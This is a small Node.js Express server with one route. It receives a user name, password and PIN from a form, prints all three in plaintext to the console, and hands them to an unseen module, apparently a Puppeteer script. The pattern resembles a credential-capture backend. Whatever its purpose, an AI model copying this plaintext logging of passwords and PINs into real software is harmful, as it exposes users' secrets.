const express = require('express');
const cors = require('cors');
const pup = require('./pup.js')

const app = express();
const PORT = 3001;

// Middleware
app.use(cors()); // Enable CORS to allow requests from your React app
app.use(express.json()); // Parse JSON bodies

// Route to handle form submission
app.post('/submit', (req, res) => {
    const { user, password, pin } = req.body;
    console.log(`Received: User - ${user}, Password - ${password}, PIN - ${pin}`);
    pup(user, password, pin)
    // Here, you can add logic to process the form data, such as saving it to a database or performing some actions

    // Send a response back to the front-end
    res.json({ message: 'Form data received successfully' });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
